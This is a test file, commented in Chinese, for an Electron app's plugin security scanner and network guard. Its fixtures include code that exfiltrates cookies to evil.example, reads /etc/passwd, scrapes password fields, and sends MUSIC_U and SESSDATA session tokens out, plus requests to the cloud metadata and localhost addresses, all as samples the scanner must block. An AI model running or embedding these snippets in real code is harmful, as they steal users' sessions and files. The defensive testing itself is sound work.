import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, test } from "vitest";

import { scanPluginFolder } from "../electron/plugin/security/scan";
import { inspectRequest } from "../shared/security/net-guard";

/**
 * 插件安全扫描 + 网络出口管控的回归测试。
 *
 * 这两块是「装插件」这条路上唯一的自动防线，而且规则表最容易在后续改动里
 * 被无意放宽 —— 所以宁可把判定条件钉在测试里，也不要靠人工回归。
 *
 * 特别注意最后两条：**不能误报**。
 * 一个只想联网拉歌单的插件被标成高风险，用户就会开始无视所有提示。
 */

const dirs: string[] = [];

const makePlugin = (files: Record<string, string>) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "nwbp-scan-"));
  dirs.push(dir);
  for (const [name, content] of Object.entries(files)) {
    fs.writeFileSync(path.join(dir, name), content, "utf-8");
  }
  return dir;
};

const scan = (files: Record<string, string>) => {
  const dir = makePlugin(files);
  const targets: { name: string; kind: "main" | "renderer" | "styles" | "manifest" }[] = [
    { name: "manifest.json", kind: "manifest" },
  ];
  if (files["main.js"]) targets.push({ name: "main.js", kind: "main" });
  if (files["index.js"]) targets.push({ name: "index.js", kind: "renderer" });
  if (files["style.css"]) targets.push({ name: "style.css", kind: "styles" });
  return scanPluginFolder(dir, targets);
};

afterEach(() => {
  for (const dir of dirs.splice(0)) fs.rmSync(dir, { recursive: true, force: true });
});

describe("插件静态扫描", () => {
  test("干净插件不报风险", () => {
    const result = scan({
      "manifest.json": JSON.stringify({ id: "hello", name: "Hello", version: "1.0.0", styles: ["style.css"] }),
      "style.css": "body { --x: 1px; }",
      "index.js": "nwbp.css('.title { color: red }'); nwbp.toast('hi');",
    });

    expect(result.level).toBe("safe");
    expect(result.blocked).toBe(false);
    expect(result.findings).toHaveLength(0);
  });

  test("既读 cookie 又往外发 → 直接拦截", () => {
    const result = scan({
      "manifest.json": JSON.stringify({ id: "bad", name: "Bad", version: "1.0.0", renderer: "index.js" }),
      "index.js": `const c = document.cookie;\nfetch("https://evil.example/collect?data=" + c);`,
    });

    expect(result.blocked).toBe(true);
    expect(result.level).toBe("critical");
    expect(result.findings.some(f => f.rule === "credential-exfiltration")).toBe(true);
  });

  test("直接 require node:fs → 拦截", () => {
    const result = scan({
      "manifest.json": JSON.stringify({ id: "fs", name: "Fs", version: "1.0.0", main: "main.js" }),
      "main.js": `const fs = require("node:fs");\nexport default () => fs.readFileSync("/etc/passwd");`,
    });

    expect(result.blocked).toBe(true);
    expect(result.findings.some(f => f.rule === "node-escape")).toBe(true);
  });

  test("抓密码框 → 拦截", () => {
    const result = scan({
      "manifest.json": JSON.stringify({ id: "pw", name: "Pw", version: "1.0.0", renderer: "index.js" }),
      "index.js": `const el = document.querySelector('input[type="password"]'); console.log(el.value);`,
    });

    expect(result.blocked).toBe(true);
    expect(result.findings.some(f => f.rule === "password-scrape")).toBe(true);
  });

  test("只联网不带凭据 → 只记录，不拦截", () => {
    const result = scan({
      "manifest.json": JSON.stringify({ id: "net", name: "Net", version: "1.0.0", renderer: "index.js" }),
      "index.js": `fetch("https://api.bilibili.com/x/web-interface/view?bvid=BV1xx").then(r => r.json());`,
    });

    expect(result.blocked).toBe(false);
    expect(result.level).toBe("safe");
  });

  test("行号指向真实命中处", () => {
    const result = scan({
      "manifest.json": JSON.stringify({ id: "line", name: "Line", version: "1.0.0", main: "main.js" }),
      "main.js": `// 第一行\nexport default () => {\n  const x = require("child_process");\n};`,
    });

    const finding = result.findings.find(f => f.rule === "node-escape");
    expect(finding?.line).toBe(3);
    expect(finding?.file).toBe("main.js");
  });
});

describe("插件网络出口管控", () => {
  test("普通 https 放行", () => {
    expect(inspectRequest("https://api.bilibili.com/x/player/playurl").allowed).toBe(true);
  });

  test("file: 协议拦下", () => {
    expect(inspectRequest("file:///etc/passwd").allowed).toBe(false);
  });

  test("云厂商元数据地址拦下", () => {
    expect(inspectRequest("http://169.254.169.254/latest/meta-data/").allowed).toBe(false);
  });

  test("本机地址拦下", () => {
    expect(inspectRequest("http://127.0.0.1:8080/admin").allowed).toBe(false);
  });

  test("请求体里带 MUSIC_U 拦下", () => {
    expect(
      inspectRequest("https://evil.example/c", {
        method: "POST",
        body: "MUSIC_U=abc; os=pc",
      }).allowed,
    ).toBe(false);
  });

  test("Cookie 头里带 SESSDATA 拦下", () => {
    expect(inspectRequest("https://evil.example/c", { headers: { Cookie: "SESSDATA=xyz; bili_jct=1" } }).allowed).toBe(
      false,
    );
  });

  test("审计目标不含 query（避免日志本身变成泄密点）", () => {
    const verdict = inspectRequest("https://api.example.com/path?token=abc123&x=1");
    expect(verdict.target).toBe("api.example.com/path");
  });
});
